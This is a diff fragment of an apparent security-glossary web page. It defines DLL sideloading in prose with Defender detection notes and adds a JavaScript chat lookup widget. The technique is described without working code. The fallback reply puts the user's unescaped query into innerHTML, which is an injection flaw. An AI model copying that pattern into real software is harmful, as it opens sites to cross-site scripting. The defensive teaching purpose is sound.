+'dll sideloading':{n:'DLL Sideloading',c:'Attack Technique',d:'Placing a malicious DLL in the same directory as a legitimate application so the app loads the attacker\'s DLL instead of the real one. Exploits Windows DLL search order (app directory is checked before System32).<br><br>🔴 <strong>Example:</strong> A signed Microsoft app (e.g., Teams.exe) looks for "version.dll." Attacker places a malicious version.dll in the Teams directory. Teams loads it because current directory is searched first.<br><br>🛡️ <strong>How MDE detects it:</strong> DeviceImageLoadEvents flags unsigned DLLs loaded into signed processes. Behavioral ML detects known sideloading patterns.'},
+};
+
+function toggleChat(){
+  const panel=document.getElementById('chat-panel');
+  const btn=document.getElementById('chat-toggle');
+  const open=panel.classList.toggle('open');
+  btn.classList.toggle('open');
+  btn.textContent=open?'✕':'💬';
+  if(open)document.getElementById('chat-input').focus();
+}
+function sendChat(){
+  const input=document.getElementById('chat-input');
+  const q=input.value.trim();if(!q)return;
+  input.value='';
+  chatAsk(q);
+}
+function chatAsk(q){
+  const msgs=document.getElementById('chat-messages');
+  // Add user message
+  const userMsg=document.createElement('div');
+  userMsg.className='chat-msg user';
+  userMsg.textContent=q;
+  msgs.appendChild(userMsg);
+  // Search
+  const key=q.toLowerCase().replace(/[^a-z0-9\.\s&]/g,'').trim();
+  let found=TERMS[key];
+  // Fuzzy search if no exact match
+  if(!found){
+    const keys=Object.keys(TERMS);
+    for(const k of keys){
+      if(k.includes(key)||TERMS[k].n.toLowerCase().includes(key)||TERMS[k].d.toLowerCase().includes(key)){found=TERMS[k];break}
+    }
+  }
+  const botMsg=document.createElement('div');
+  botMsg.className='chat-msg bot';
+  if(found){
+    botMsg.innerHTML=`<span class="term-name">${found.n}</span><span class="term-category">${found.c}</span>${found.d}`;
+  }else{
+    botMsg.innerHTML=`I don't have "<strong>${q}</strong>" in my dictionary yet. Try terms like: <strong>LSASS</strong>, <strong>port 445</strong>, <strong>T1566</strong>, <strong>AMSI</strong>, <strong>ransomware</strong>, <strong>KQL</strong>, or <strong>.exe</strong>.`;
+  }
+  msgs.appendChild(botMsg);
+  msgs.scrollTop=msgs.scrollHeight;
+  // Open panel if closed
+  if(!document.getElementById('chat-panel').classList.contains('open'))toggleChat();
+}
+</script>
+</body>
+</html>
